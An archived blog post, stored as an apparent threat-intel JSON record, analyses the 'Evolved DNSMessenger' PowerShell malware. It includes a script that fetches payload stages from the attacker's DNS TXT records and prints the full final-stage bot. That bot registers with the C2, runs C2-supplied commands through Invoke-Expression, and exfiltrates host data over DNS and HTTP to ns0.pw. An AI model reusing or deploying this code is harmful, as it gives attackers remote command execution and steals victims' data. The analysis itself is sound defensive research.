{
    "id": "056b6521-a526-423b-a143-b0abcbb464c2",
    "created_at": "2023-01-12T15:05:27.153554Z",
    "updated_at": "2025-03-27T02:05:24.524727Z",
    "deleted_at": null,
    "sha1_hash": "8b09c34464e3a0e7ac852a36160cb2f0836f2b28",
    "title": "2017-10-11 - More info on 'Evolved DNSMessenger'",
    "authors": "",
    "file_creation_date": "2022-05-28T02:17:59Z",
    "file_modification_date": "2022-05-28T02:17:59Z",
    "file_size": 121826,
    "plain_text": "# More info on “Evolved DNSMessenger”\n\n**[wraithhacker.com/2017/10/11/more-info-on-evolved-dnsmessenger/](http://wraithhacker.com/2017/10/11/more-info-on-evolved-dnsmessenger/)**\n\nBy ajyates October 11, 2017\n\n## I read the recent blog post from Talos Intelligence. Great write up, but noticed they mentioned they were unable to get the final stage of the payload. I had also analyzed the “EDGAR_Rules_2017.docx” document yesterday, and happened to get the final payload.\n\n So picking up where they left off –\n\n As they described, the stager powershell code uses DNS A records and TXT records to pull down the next payload. After some testing with the malicious powershell code, I ran into similar issues as Talos likely did and couldn’t get the next payload. Eventually I determined the A records were unnecessary, so wrote up my own quick powershell to pull down all the TXT records (turned out to be 44 TXT requests):\n\n\n-----\n\n```\n$complete  ;\n$count = 0;\nwhile($count -lt 44)\n{\n $lookup_domain = \"AAAAAAAAAA.stage.$count.ns1.press\";\n $nslookup_result = nslookup -type=txt $lookup_domain 2>&1;\n #Write-Host($nslookup_result);\n $regex = [regex]\n$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAiAFsAXgBcAHMAXQAq\n #(\"[^\\s]*\"\\s*)+\n $regex_txt_result = $regex.Matches($nslookup_result);\n #Write-Host($regex_txt_result);\n $value = ($regex.Matches($nslookup_result) | Select -ExpandProperty Value) -join ''\n-replace '\"' -replace '`n' -replace ' ';\n Write-Host($value);\n $complete += $value;\n Write-Host(\"Current stage: \" + $count);\n Write-Host(\"Payload: \" + $complete);\n sleep -s 1;\n $count++;\n}\n\n## This resulted in a final payload of:\nH4sIAJ2R3VkC/909a1fbSJafyTn5DxXhbkvYEpg8pgcjpnnkwXQgLNCTnnG8HdkqQGBLjiRDCPE5+x/2H+4v2X\n\n Next I used the same powershell code to decode the base64, then decompress and print the result:\n$data=[System.Convert]::FromBase64String('{PLACE BASE64 HERE}');\n$ms=New-Object System.IO.MemoryStream;\n$ms.Write($data,0,$data.Length);\n$ms.Seek(0,0)|Out-Null;\n$cs=New-Object System.IO.Compression.GZipStream($ms,\n[System.IO.Compression.CompressionMode]::Decompress);\n$sr=New-Object System.IO.StreamReader($cs);\nWrite-Output(\"Output2:\")\nWrite-Output($sr.readtoend())\n\n Final payload:\n\n```\n\n-----\n\n```\n# This section should be ommited as it is present in Stager\n# =============================================================================\n$domains =\n@(\"ns0.pw\",\"ns0.site\",\"ns0.space\",\"ns0.website\",\"ns1.press\",\"ns1.website\",\"ns2.press\",\n$retryCount = 10\n$retryCountDoDns = 10\n$biginteger = @\"\nusing System;using System.Runtime.Serialization;using\nSystem.Runtime.Serialization.Formatters;using System.Security.Permissions;using\nSystem.Text;using System.Collections.Generic;namespace X{enum\nSign{Positive,Negative};[Serializable]\npublic sealed class BigIntegerException:Exception\n{public BigIntegerException(string message,Exception\ninnerException):base(message,innerException)\n{}}\n[Serializable]\npublic sealed class\nBigInteger:ISerializable,IEquatable,IComparable,IComparable{private const long\nNumberBase=65536;internal const int MaxSize=2*640;private const int\nRatioToBinaryDigits=16;private static readonly BigInteger Zero=new B\nigInteger();private static readonly BigInteger One=new BigInteger(1);private static\nreadonly BigInteger Two=new BigInteger(2);private static readonly BigInteger Ten=new\nBigInteger(10);private long[]digits;private int size;private Sign sign;public\nBigInteger()\n{digits=new long[MaxSize];size=1;digits[size]=0;sign=Sign.Positive;}\npublic BigInteger(long n)\n{digits=new long[MaxSize];sign=Sign.Positive;if(n==0)\n{size=1;digits[size]=0;}\nelse\n{if(n<0)\n{n=-n;sign=Sign.Negative;}\nsize=0;while(n>0)\n{digits[size]=n%NumberBase;n/=NumberBase;size++;}}}\npublic BigInteger(BigInteger n)\n{digits=new long[MaxSize];size=n.size;sign=n.sign;for(int i=0;i'9'))\n{if((i==0)&&(numberString[i]=='-'))\nnumberSign=Sign.Negative;else\nthrow new BigIntegerException(\"Invalid numeric string.\",null);}\nelse\nnumber=number*Ten+long.Parse(numberString[i].ToString());}\nsign=numberSign;digits=new long[MaxSize];size=number.size;for(i=0;iMaxSize)\nthrow new BigIntegerException(\"The byte array's content exceeds the maximum size of a\nBigInteger.\",null);digits=new long[MaxSize];sign=Sign.Positive;for(int i=0;i0)&&\n(reducible==true))\n{if(digits[size-1]==0)\nsize--;else reducible=false;}}\nprivate BigInteger(SerializationInfo info,StreamingContext context)\n{bool signValue=(bool)info.GetValue(\"sign\",typeof(bool));if(signValue==true)\nsign=Sign.Positive;else\nsign=Sign.Negative;size=(int)info.GetValue(\"size\",typeof(short));digits=new\nlong[MaxSize];int i;for(i=0;ib.size)\nreturn true;if(a.size=0;i--)\nif(a.digits[i]>b.digits[i])\n\n```\n\n-----\n\n```\nreturn true;else if(a.digits[i]b.size)\nreturn false;for(int i=(a.size)-1;i>=0;i--)\nif(a.digits[i]b.digits[i])\nreturn false;}}\nreturn false;}\npublic static bool GreaterOrEqual(BigInteger a,BigInteger b)\n{return Greater(a,b)||Equals(a,b);}\npublic static bool Smaller(BigInteger a,BigInteger b)\n{return!GreaterOrEqual(a,b);}\npublic static bool SmallerOrEqual(BigInteger a,BigInteger b)\n{return!Greater(a,b);}\npublic static BigInteger Abs(BigInteger n)\n{BigInteger res=new BigInteger(n);res.sign=Sign.Positive;return res;}\npublic static BigInteger Addition(BigInteger a,BigInteger b)\n{BigInteger res=null;if((a.sign==Sign.Positive)&&(b.sign==Sign.Positive))\n{if(a>=b)\nres=Add(a,b);else\nres=Add(b,a);res.sign=Sign.Positive;}\nif((a.sign==Sign.Negative)&&(b.sign==Sign.Negative))\n{if(a<=b)\nres=Add(-a,-b);else\nres=Add(-b,-a);res.sign=Sign.Negative;}\nif((a.sign==Sign.Positive)&&(b.sign==Sign.Negative))\n{if(a>=(-b))\n{res=Subtract(a,-b);res.sign=Sign.Positive;}\nelse\n{res=Subtract(-b,a);res.sign=Sign.Negative;}}\nif((a.sign==Sign.Negative)&&(b.sign==Sign.Positive))\n{if((-a)<=b)\n{res=Subtract(b,-a);res.sign=Sign.Positive;}\nelse\n{res=Subtract(-a,b);res.sign=Sign.Negative;}}\nreturn res;}\npublic static BigInteger Subtraction(BigInteger a,BigInteger b)\n{BigInteger res=null;if((a.sign==Sign.Positive)&&(b.sign==Sign.Positive))\n{if(a>=b)\n{res=Subtract(a,b);res.sign=Sign.Positive;}\nelse\n{res=Subtract(b,a);res.sign=Sign.Negative;}}\nif((a.sign==Sign.Negative)&&(b.sign==Sign.Negative))\n{if(a<=b)\n{res=Subtract(-a,-b);res.sign=Sign.Negative;}\nelse\n{res=Subtract(-b,-a);res.sign=Sign.Positive;}}\nif((a.sign==Sign.Positive)&&(b.sign==Sign.Negative))\n{if(a>=(-b))\nres=Add(a,-b);else\nres=Add(-b,a);res.sign=Sign.Positive;}\nif((a.sign==Sign.Negative)&&(b.sign==Sign.Positive))\n{if((-a)>=b)\nres=Add(-a,b);else\nres=Add(b,-a);res.sign=Sign.Negative;}\nreturn res;}\npublic static BigInteger Multiplication(BigInteger a,BigInteger b)\n{if((a==Zero)||(b==Zero))\n\n```\n\n-----\n\n```\nreturn Zero;BigInteger res Multiply(Abs(a),Abs(b));if(a.sign b.sign)\nres.sign=Sign.Positive;else\nres.sign=Sign.Negative;return res;}\npublic static BigInteger Division(BigInteger a,BigInteger b)\n{if(b==Zero)\nthrow new BigIntegerException(\"Cannot divide by zero.\",new\nDivideByZeroException());if(a==Zero)\nreturn Zero;if(Abs(a)(BigInteger a,BigInteger b)\n{return Greater(a,b);}\npublic static bool operator=(BigInteger a,BigInteger b)\n{return GreaterOrEqual(a,b);}\npublic static bool operator<=(BigInteger a,BigInteger b)\n{return SmallerOrEqual(a,b);}\npublic static BigInteger operator-(BigInteger n)\n{return Opposite(n);}\npublic static BigInteger operator+(BigInteger a,BigInteger b)\n{return Addition(a,b);}\npublic static BigInteger operator-(BigInteger a,BigInteger b)\n{return Subtraction(a,b);}\npublic static BigInteger operator*(BigInteger a,BigInteger b)\n{return Multiplication(a,b);}\npublic static BigInteger operator/(BigInteger a,BigInteger b)\n{return Division(a,b);}\npublic static BigInteger operator%(BigInteger a,BigInteger b)\n{return Modulo(a,b);}\npublic static BigInteger operator++(BigInteger n)\n{BigInteger res=n+One;return res;}\npublic static BigInteger operator--(BigInteger n)\n{BigInteger res=n-One;return res;}\nprivate static BigInteger Add(BigInteger a,BigInteger b)\n{BigInteger res=new BigInteger(a);long trans=0,temp;int i;for(i=0;i0));i++)\n{temp=res.digits[i]+trans;res.digits[i]=temp%NumberBase;trans=temp/NumberBase;}\nif(trans>0)\n{res.digits[res.size]=trans%NumberBase;res.size++;trans/=NumberBase;}\nreturn res;}\nprivate static BigInteger Subtract(BigInteger a,BigInteger b)\n{BigInteger res=new BigInteger(a);int i;long temp,trans=0;bool\nreducible=true;for(i=0;i0));i++)\n{temp=res.digits[i]-trans;if(temp<0)\n{trans=1;temp+=NumberBase;}\nelse trans=0;res.digits[i]=temp;}\nwhile((res.size-1>0)&&(reducible==true))\n{if(res.digits[res.size-1]==0)\nres.size--;else reducible=false;}\nreturn res;}\nprivate static BigInteger Multiply(BigInteger a,BigInteger b)\n{int i,j;long temp,trans=0;BigInteger res=new BigInteger();res.size=a.size+b.size1;for(i=0;i0)\n{res.digits[res.size]=trans%NumberBase;res.size++;trans/=NumberBase;}\nreturn res;}\nprivate static BigInteger DivideByOneDigitNumber(BigInteger a,long b)\n{BigInteger res=new BigInteger();int i=a.size-1;long\ntemp;res.size=a.size;temp=a.digits[i];while(i>=0)\n{res.digits[i]=temp/b;temp%=b;i--;if(i>=0)\ntemp=temp*NumberBase+a.digits[i];}\n\n```\n\n-----\n\n```\nif((res.digits[res.size 1] 0)&&(res.size! 1))\nres.size--;return res;}\nprivate static BigInteger DivideByBigNumber(BigInteger a,BigInteger b)\n{int k,n=a.size,m=b.size;long f,qt;BigInteger d,dq,q,r;f=NumberBase/(b.digits[m1]+1);q=new BigInteger();r=a*f;d=b*f;for(k=n-m;k>=0;k--)\n{qt=Trial(r,d,k,m);dq=d*qt;if(DivideByBigNumberSmaller(r,dq,k,m))\n{qt--;dq=d*qt;}\nq.digits[k]=qt;Difference(r,dq,k,m);}\nq.size=n-m+1;if((q.size!=1)&&(q.digits[q.size-1]==0))\nq.size--;return q;}\nprivate static bool DivideByBigNumberSmaller(BigInteger r,BigInteger dq,int k,int m)\n{int i=m,j=0;while(i!=j)\n{if(r.digits[i+k]!=dq.digits[i])\nj=i;else i--;}\nif(r.digits[i+k] postParameters)\n  {\n    string formDataBoundary = String.Format(\"----------{0:N}\", Guid.NewGuid());\n    string contentType = \"multipart/form-data; boundary=\" + formDataBoundary;\n    byte[] formData = GetMultipartFormData(postParameters, formDataBoundary);\n    return PostForm(postUrl, userAgent, contentType, formData);\n  }\n  private static HttpWebResponse PostForm(string postUrl, string userAgent, string\ncontentType, byte[] formData)\n  {\n    HttpWebRequest request = WebRequest.Create(postUrl) as HttpWebRequest;\n    if (request == null)\n    {\n      throw new NullReferenceException(\"request is not a http request\");\n    }\n    // Set up the request properties.\n    request.Method = \"POST\";\n    request.ContentType = contentType;\n    request.UserAgent = userAgent;\n    request.CookieContainer = new CookieContainer();\n    request.ContentLength = formData.Length;\n    // You could add authentication here as well if needed:\n    // request.PreAuthenticate = true;\n    // request.AuthenticationLevel =\nSystem.Net.Security.AuthenticationLevel.MutualAuthRequested;\n    // request.Headers.Add(\"Authorization\", \"Basic \" +\nConvert.ToBase64String(System.Text.Encoding.Default.GetBytes(\"username\" + \":\" +\n\"password\")));\n    // Send the form data to the request.\n    using (Stream requestStream = request.GetRequestStream())\n    {\n      requestStream.Write(formData, 0, formData.Length);\n      requestStream.Close();\n    }\n\n```\n\n-----\n\n```\n    return request.GetResponse() as HttpWebResponse;\n  }\n  private static byte[] GetMultipartFormData(Dictionary postParameters, string\nboundary)\n  {\n    Stream formDataStream = new System.IO.MemoryStream();\n    bool needsCLRF = false;\n    foreach (KeyValuePair param in postParameters)\n    {\n      // Thanks to feedback from commenters, add a CRLF to allow multiple\nparameters to be added.\n      // Skip it on the first parameter, add it to subsequent parameters.\n      if (needsCLRF)\n        formDataStream.Write(encoding.GetBytes(\"\\r\\n\"), 0,\nencoding.GetByteCount(\"\\r\\n\"));\n      needsCLRF = true;\n      string postData = string.Format(\"--{0}\\r\\nContent-Disposition: form-data;\nname=\\\"{1}\\\"\\r\\n\\r\\n{2}\",\n        boundary,\n        param.Key,\n        param.Value);\n      formDataStream.Write(encoding.GetBytes(postData), 0,\nencoding.GetByteCount(postData));\n    }\n    // Add the end of the request. Start with a newline\n    string footer = \"\\r\\n--\" + boundary + \"--\\r\\n\";\n    formDataStream.Write(encoding.GetBytes(footer), 0,\nencoding.GetByteCount(footer));\n    // Dump the Stream into a byte[]\n    formDataStream.Position = 0;\n    byte[] formData = new byte[formDataStream.Length];\n    formDataStream.Read(formData, 0, formData.Length);\n    formDataStream.Close();\n    return formData;\n  }\n}\n\"@\nif (-not ([System.Management.Automation.PSTypeName]'X.BigInteger').Type) {\n  Add-Type -TypeDefinition $biginteger -Language CSharp\n}\nif (-not ([System.Management.Automation.PSTypeName]'FormUpload').Type) {\n  Add-Type -TypeDefinition $form -Language CSharp\n}\nfunction ConvertTo-Dictionary\n{\n  #requires -Version 2.0\n\n```\n\n-----\n\n```\n  [CmdletBinding()]\n  param (\n    [Parameter(Mandatory = $true, ValueFromPipeline = $true)]\n    [hashtable]\n    $InputObject,\n    [Type]\n    $KeyType = [string]\n  )\n  process\n  {\n    $outputObject = New-Object\n\"System.Collections.Generic.Dictionary[[$($KeyType.FullName)],[Object]]\"\n    foreach ($entry in $InputObject.GetEnumerator())\n    {\n      $newKey = $entry.Key -as $KeyType\n      if ($null -eq $newKey)\n      {\n        throw 'Could not convert key \"{0}\" of type \"{1}\" to type \"{2}\"' -f\n           $entry.Key,\n           $entry.Key.GetType().FullName,\n           $KeyType.FullName\n      }\n      elseif ($outputObject.ContainsKey($newKey))\n      {\n        throw \"Duplicate key `\"$newKey`\" detected in input object.\"\n      }\n      $outputObject.Add($newKey, $entry.Value)\n    }\n    Write-Output $outputObject\n  }\n}\nfunction Pick-Domain {\n  param([array]$DomainList)\n  if ($DomainList.count -eq 1) {\n    return $DomainList\n  }\n  return $DomainList[(Get-Random -Maximum ([array]$DomainList).count)]\n}\nfunction Identify-Machine() {\n  $serial = Get-WmiObject Win32_BIOS | Select -ExpandProperty SerialNumber\n  $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider\n  $hash = ($md5.ComputeHash([system.Text.Encoding]::UTF8.GetBytes($serial)) | \nforeach { $_.ToString(\"X2\") }) -join \"\"\n  return $hash.Substring(0, 10)\n\n```\n\n-----\n\n```\n}\nfunction Try-Domains {\n  [CmdletBinding()]\n  param([Parameter(ValueFromPipeline=$True)][array]$DomainList,\n[scriptblock]$Action)\n  if ((-not $DomainList) -or ($DomainList.count -eq 0) -or ($retryCount -eq 0)) {\n    Throw \"No domains\"\n  }\n  $domain = Pick-Domain $DomainList\n  try {\n    return &$Action -Domain $domain\n  } catch {\n    $retryCount-    return Try-Domains ([array]($DomainList)) $Action # | Where-Object { $_ –ne\n$domain }\n  }\n}\nfunction Do-DNS-A {\n  [CmdletBinding()]\n  param([Parameter()]$dns)\n  Write-Debug \"[DNS] (A) ==> ${dns}\"\n  $data = nslookup -type=a $dns 2>&1\n  $regexp = [regex] \"\\s*$dns(.localdomain)*\\s*Address(es)*:\\s*([\\d\\.]*)\"\n  $match = $regexp.Match($data)\n     $countNow = 0\n  while ((-not $match.Success) -and ($countNow -ne $retryCountDoDns)) {\n          Start-Sleep -s 5\n    $data = nslookup -type=a $dns 2>&1\n          $regexp = [regex] \"\\s*$dns(.localdomain)*\\s*Address(es)*:\\s*\n([\\d\\.]*)\"\n          $match = $regexp.Match($data)\n          $countNow = $countNow + 1\n  }\n     if ((-not $match.Success)) {\n          return 0\n     }\n  return $match.Groups[3].Value\n}\nfunction Do-DNS-TXT {\n  [CmdletBinding()]\n  param([Parameter()]$dns)\n  Write-Debug \"[DNS] (TXT) ==> ${dns}\"\n  $data = nslookup -type=txt $dns 2>&1\n  $regexp = [regex] '(\"[^\\s]*\"\\s*)+'\n  $matches = $regexp.Matches($data)\n     $countNow = 0\n     while (($matches.count -eq 0) -and ($countNow -ne $retryCountDoDns)) {\n          Start-Sleep -s 5\n\n```\n\n-----\n\n```\n    $data nslookup type txt $dns 2>&1\n          $regexp = [regex] '(\"[^\\s]*\"\\s*)+'\n          $matches = $regexp.Matches($data)\n          $countNow = $countNow + 1\n  }\n  if ($matches.count -eq 0) {\n    return 0\n  }\n  return ($matches | Select -ExpandProperty Value) -join '' -replace '\"' -replace\n'`n' -replace ' '\n}\nfunction Get-DecompressedString {\n     [CmdletBinding()]\n  Param (\n[Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$Tr\n    [byte[]] $byteArray = $(Throw(\"-byteArray is required\"))\n  )\n     Process {\n       Write-Verbose \"Get-DecompressedByteArray\"\n    $ms = New-Object System.IO.MemoryStream\n    $ms.Write($byteArray, 0, $byteArray.Length)\n    $null = $ms.Seek(0,0)\n    $cs = New-Object System.IO.Compression.GZipStream($ms,\n[System.IO.Compression.CompressionMode]::Decompress)\n    $out = New-Object System.IO.MemoryStream\n    $sr = New-Object System.IO.StreamReader($cs, [system.Text.Encoding]::UTF8)\n    Write-Output $sr.readtoend();\n  }\n}\nfunction Decode-String {\n  [CmdletBinding()]\n  param([Parameter(ValueFromPipeline=$True)]$Code)\n     if ($Code -eq 0) {\n          return 0\n     }\n  $gzipBytes = [System.Convert]::FromBase64String($Code)\n  return Get-DecompressedString($gzipBytes)\n}\nfunction Encode-Base58{\n  [CmdletBinding()]\n  param([Parameter()]$bytes)\n  $base58digits = \"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\"\n  # get big int representation\n  $dBig = New-Object X.BigInteger 0\n  $bytes | %{ $dBig = $dBig * 256 + $_ }\n\n```\n\n-----\n\n```\n  # combine into string\n  $result = [System.String]::Empty\n  while ($dBig -gt 0) {\n    $rem = ($dBig % 58).ToInt()\n    $dBig /= 58\n    $result = $base58digits[$rem] + $result\n  }\n  foreach ($b in $bytes) {\n    if ($b -ne 0) { break }\n    $result = '1' + $result\n  }\n  return $result\n}\nfunction Encode-Data{\n  [CmdletBinding()]\n  param([Parameter()]$data)\n  $bytes = [system.Text.Encoding]::UTF8.GetBytes($data)\n  $b58bytes = Encode-Base58 $bytes\n  $split = ([regex]::matches($b58bytes, '.{1,63}') | %{$_.value}) -join '.'\n  return $split\n}\nfunction Encode-HTTP-Data {\n  [CmdletBinding()]\n  param([Parameter()]$data)\n  $bytes = [system.Text.Encoding]::UTF8.GetBytes($data)\n  return [System.Convert]::ToBase64String($bytes)\n}\n# =============================================================================\nfunction Register-Bot {\n  [CmdletBinding()]\n  param([Parameter()]$DomainList)\n  $regSuccess = Try-Domains $DomainList {\n    return Do-DNS-TXT \"$(Identify-Machine).add.$domain\"\n  }\n  if ($regSuccess -ne \"1\") {\n    throw \"Bad registration\"\n  }\n}\nfunction Exec-Timeout {\n  [CmdletBinding()]\n  param([Parameter(ValueFromPipeline=$True)][string]$command)\n  $timeoutSeconds = 10\n  Write-Host $command\n  $val = \"failure\"\n\n```\n\n-----\n\n```\n  $code {\n    param($c)\n    Invoke-Expression $c\n  }\n  $j = Start-Job -ScriptBlock $code -ArgumentList $command\n  if (Wait-Job $j -Timeout $timeoutSeconds) {\n    $val = Receive-Job $j\n  }\n  Remove-Job -force $j\n  return $val\n}\nfunction Execute-Dict {\n  [CmdletBinding()]\n  param([Parameter(ValueFromPipeline=$True)]$Data)\n  $output = @{}\n  $Data.GetEnumerator() | % {\n    $val = try { Exec-Timeout $_.value } catch { \"Failure\" }\n    $output[$_.key] = $val\n  }\n  return $output\n}\nfunction Do-Bad-Job {\n  [CmdletBinding()]\n  param([Parameter()]$DomainList, [Parameter()]$Data)\n  Execute-Dict $Data | %{$_.GetEnumerator()} | %{\n    try {\n      $letter = $_.key\n      $sdata = $_.value\n      $enc = Encode-Data $sdata\n      Write-Debug \"[General data] ${letter}: ${sdata} => ${enc}\"\n      Try-Domains $DomainList {\n        $response = Do-DNS-A \"${enc}.${letter}.$(Identify-Machine).i.$domain\"\n#| Select -ExpandProperty IPAddress\n        if ($response -ne '1.1.1.1') {\n          Throw 'Bad response 3'\n        }\n      }\n    } catch {\n      Write-Debug \"[General data] Unable to send ${letters} --> $($error[0])\"\n    }\n  }\n  Write-Debug \"[General data] Complete\"\n}\nfunction Read-Mode {\n  [CmdletBinding()]\n  param([Parameter()]$DomainList)\n  return Try-Domains $DomainList {\n    return Do-DNS-TXT \"$(Identify-Machine).mx1.$domain\"\n  }\n\n```\n\n-----\n\n```\n}\nfunction Get-WWW-PS {\n  [CmdletBinding()]\n  param([Parameter()]$DomainList)\n  return Try-Domains $DomainList {\n    return Do-DNS-TXT \"$(Identify-Machine).www.$domain\" | Decode-String\n  }\n}\nfunction ConvertTo-Json20([object] $item){\n  try{\n    add-type -assembly system.web.extensions\n    $ps_js=new-object system.web.script.serialization.javascriptSerializer\n    return $ps_js.Serialize($item)\n  } catch {\n    Write-Host \"Exception on json encode\"\n  }\n}\nfunction ConvertFrom-Json20([object] $item){\n  add-type -assembly system.web.extensions\n  $ps_js=new-object system.web.script.serialization.javascriptSerializer\n  #The comma operator is the array construction operator in PowerShell\n  return,$ps_js.DeserializeObject($item)\n}\nfunction Escape-JSONString($str){\n if ($str -eq $null) {return \"\"}\n $str =\n$str.ToString().Replace('\"','''').Replace('\\','/').Replace(\"`n\",'\\n').Replace(\"`r\",'\\r\n return $str;\n}\nfunction ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {\n     begin {\n          $data = @()\n     }\n     process{\n          $data += $_\n     }\n     end{\n          if ($data.length -eq 1 -and $forceArray -eq $false) {\n              $value = $data[0]\n          } else {\n              $value = $data\n          }\n          if ($value -eq $null) {\n              return \"null\"\n          }\n\n```\n\n-----\n\n```\n          $dataType = $value.GetType().Name\n          switch -regex ($dataType) {\n           'String' {\n                        return \"`\"{0}`\"\" -f (Escape-JSONString\n$value )\n                   }\n           '(System\\.)?DateTime' {return \"`\"{0:yyyy-MM-dd}T{0:HH:mm:ss}`\"\"\n-f $value}\n           'Int32|Double' {return \"$value\"}\n                   'Boolean' {return \"$value\".ToLower()}\n           '(System\\.)?Object\\[\\]' { # array\n                        if ($maxDepth -le 0){return \"`\"$value`\"\"}\n                        $jsonResult = ''\n                        foreach($elem in $value){\n                             #if ($elem -eq $null) {continue}\n                             if ($jsonResult.Length -gt 0)\n{$jsonResult +=', '}\n                             $jsonResult += ($elem | ConvertToJSON -maxDepth ($maxDepth -1))\n                        }\n                        return \"[\" + $jsonResult + \"]\"\n           }\n                   '(System\\.)?Hashtable' { # hashtable\n                        $jsonResult = ''\n                        foreach($key in $value.Keys){\n                             if ($jsonResult.Length -gt 0)\n{$jsonResult +=', '}\n                             $jsonResult +=\n@\"\n     \"{0}\": {1}\n\"@ -f $key, ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )\n                        }\n                        return \"{\" + $jsonResult + \"}\"\n                   }\n           default { #object\n                        if ($maxDepth -le 0){return \"`\"{0}`\"\" -f\n(Escape-JSONString $value)}\n                        return \"{\" +\n                             (($value | Get-Member -MemberType\n*property | % {\n@\"\n     \"{0}\": {1}\n\"@ -f $_.Name, ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )\n                        }) -join ', ') + \"}\"\n              }\n          }\n     }\n}\n\n```\n\n-----\n\n```\n#\"a\" | ConvertTo-JSON\n#dir \\ | ConvertTo-JSON\n#(get-date) | ConvertTo-JSON\n#(dir \\)[0] | ConvertTo-JSON -maxDepth 1\n#@{ \"asd\" = \"sdfads\" ; \"a\" = 2 } | ConvertTo-JSON\nfunction Send-HTTP-Data {\n  [CmdletBinding()]\n  param([Parameter()]$DomainList, [Parameter()]$data)\n  # encode data\n  Write-Host \"Start send http\"\n  Write-Host \"Data: $data\"\n  $encdata = $data | ConvertTo-JSON #Encode-HTTP-Data $data\n  $dataToSend = @{'hwid' = $(Identify-Machine); 'data' = $encdata }# | ConvertToJSON\n  Write-Host $dataToSend\n  return Try-Domains $DomainList {\n    #$url = \"http://$(Identify-Machine).http.$domain\"\n    $url = \"http://ns0.pw/index.php?r=bot-result/index\"\n    $ua = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/41.0.2228.0 Safari/537.36\"\n    Write-Host \"[HTTP] ===> $url\"\n    try {\n      # $d = ConvertTo-Dictionary $dataToSend | ConvertTo-JSON\n      $dataToSend = $dataToSend | ConvertTo-Dictionary -KeyType String\n      $response = [FormUpload]::MultipartFormDataPost($url, $ua, $dataToSend)\n#, $dataToSend\n      $reader = New-Object\nSystem.IO.StreamReader($response.GetResponseStream())\n      Write-Debug \"[HTTP] Finished\"\n      return $reader.ReadToEnd()\n    } catch {\n      Write-Host \"Exception send http\"\n      Write-Host $Error[0]\n    }\n  }\n}\nfunction Main-Loop {\n  [CmdletBinding()]\n  param([Parameter()]$DomainList)\n  while (1) {\n    try {\n      # get mode\n      $mode = Read-Mode $domains\n      $interval = 0\n      Write-Host $mode\n      switch ($mode){\n        '3' { break }\n        '0' { $interval = 5*60 }\n        '1' { $interval = 12*60*60 }\n      }\n      Write-Host $interval\n\n```\n\n-----\n\n```\n    } catch {\n      Write-Host \"Error check mode!!!\"\n      Write-Host $Error[0]\n    }\n    try {\n      # NO www=exit HANDLING\n      $data = Get-Tasks $DomainList\n      Write-Host $data\n      $taskType = ''\n      $data_new = @{}\n      $sdata = ConvertFrom-Json20 $data #| ConvertTo-Dictionary\n      foreach ($itemKey in $sdata.Keys) {\n        if ($itemKey -ne 'taskType' ) {\n          $data_new[$itemKey] = $sdata[$itemKey]\n        } else {\n          $taskType = $sdata[$itemKey]\n        }\n      }\n      $data = Execute-Dict $data_new\n      Write-Host \"Dict exec ok\"\n      $data['taskType'] = $taskType\n      Write-Debug \"[Main-Loop] Data: ${data}\"\n      # convert to dictionary if not a dictionary\n      if ($data -isnot [System.Collections.HashTable]){\n        $data = @{'response'=$data}\n      }\n      # if not OK code -- exception\n      try{\n        Write-Host \"Try send\"\n        $a = Send-HTTP-Data $DomainList $data\n        Write-Host $a\n      } catch {\n        Write-Host \"Is no domains? $Error[0]\"\n      }\n    } catch {\n      Write-Debug \"[Main-Loop] Execution crashed\"\n      Write-Host $Error[0]\n    }\n    Write-Debug \"[Main-Loop] Start sleeping for ${interval}s\"\n    Start-Sleep -s $interval\n  }\n}\nfunction Get-Tasks {\n  [CmdletBinding()]\n  param([Parameter(ValueFromPipeline=$True)]$DomainList)\n  return Download-Big-TXT $DomainList \"www\" | Decode-String\n}\n\n```\n\n-----\n\n```\n$baseData = @{\n  'u'='$env:username'\n  'd'='$env:userdomain'\n  'o'='Get-WmiObject Win32_OperatingSystem | Select -ExpandProperty Caption'\n  'h'='hostname'\n  'a'='1'\n  'org'='Get-WmiObject Win32_OperatingSystem | Select -ExpandProperty Organization\n| %{if ([string]::IsNullOrEmpty($_)) {\"NoOrg\"} else {$_}}'\n  'arc'='Get-WmiObject Win32_OperatingSystem | Select -ExpandProperty\nOSArchitecture'\n}\ntry{\n  [Console]::OutputEncoding = [system.Text.Encoding]::UTF8\n} catch {\n  Write-Host $Error[0]\n}\ntry {\n  # register bot\n  Register-Bot $domains\n  # send data\n  Do-Bad-Job $domains $baseData\n  # enter main loop\n  Main-Loop $domains\n} catch {\n  Write-Debug \"Error: \"\n  Write-Debug $Error[0]\n}\n\n## The result is just your typical C&C bot code, still using the same C&C servers mentioned in the Talos Intelligence blog.\n\n A different structure of DNS records is being used for different commands. Instead of the hardcoded “stage” string to make up the URL (such as AAAAAAAAAA.stage.0.ns0.pw), we now have “add” (register bot), “mx1” (get ‘mode’), and “www” (get tasks). Exfiltration appears to be done via a web form hardcoded to the url: hxxp://ns0[.]pw/index[.]php?r=bot- result/index\n\n I registered a “fake bot” to see what the initial list of tasks were. The first list of tasks were:\n{\"taskType\": \"fullinfo\", \"24\": \"tasklist /v\", \"25\": \"wmic process get\ncaption,commandline,processid\", \"26\": \"wmic process get\ncaption,commandline,processid\", \"27\": \"wmic logicaldisk get\ncaption,description,drivetype,providername,volumename\", \"21\": \"netsh fire\nwall show state\", \"22\": \"netsh firewall show config\", \"23\": \"schtasks /query /fo LIST\n/v\", \"28\": \"tasklist /SVC\", \"29\": \"net start\", \"1\": \"systeminfo\", \"2\": \"echo\n%username% %userprofile%\", \"5\": \"whoami /all\", \"4\": \"hostname\", \"7\": \"net user\",\n\"12\": \"net use\"\n, \"15\": \"wmic startup list brief\", \"14\": \"wmic share list brief\", \"17\": \"route\nprint\", \"16\": \"ipconfig /all\", \"19\": \"netstat -anop tcp\", \"18\": \"arp -A\", \"31\": \"wmic\nqfe get Description,HotFixID,InstalledOn\", \"30\": \"driverquery\", \"32\": \"cd\n%ProgramFiles% & dir\n & cd %ProgramFiles(x86)% & dir\"}\n\n```\n\n-----\n\n## So just typical information gathering commands.\n\n I’ll let other do more analysis if desired, just wanted to provide additional information\n\n\n-----",
    "language": "EN",
    "sources": [
        {
